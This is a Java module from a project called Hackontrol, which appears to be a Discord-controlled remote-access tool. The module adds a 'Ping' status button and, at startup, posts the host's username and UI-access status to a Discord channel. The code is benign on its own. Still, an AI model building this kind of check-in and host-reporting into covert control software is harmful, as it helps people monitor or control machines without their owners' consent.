package com.khopan.hackontrol.module;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.nativelibrary.Information;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;

public class HackontrolModule extends Module {
	private static String MODULE_NAME = "hackontrol";

	private static final Button BUTTON_PING = ButtonManager.staticButton(ButtonType.SUCCESS, "Ping",   "ping");

	@Override
	public String getName() {
		return HackontrolModule.MODULE_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, HackontrolModule.BUTTON_PING,  context -> HackontrolMessage.deletable(context.reply(), "**Status: Ok**"));
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(HackontrolModule.BUTTON_PING)).queue();
	}

	@Override
	public void postInitialize() {
		long time = Hackontrol.STARTUP_TIME / 1000L;
		this.channel.sendMessage("**Online: <t:" + time + ":f> (<t:" + time + ":R>) (" + Information.getUserName() + ") (" + (Information.isEnabledUIAccess() ? "" : "No ") + "UI Access)**").queue();
	}
}
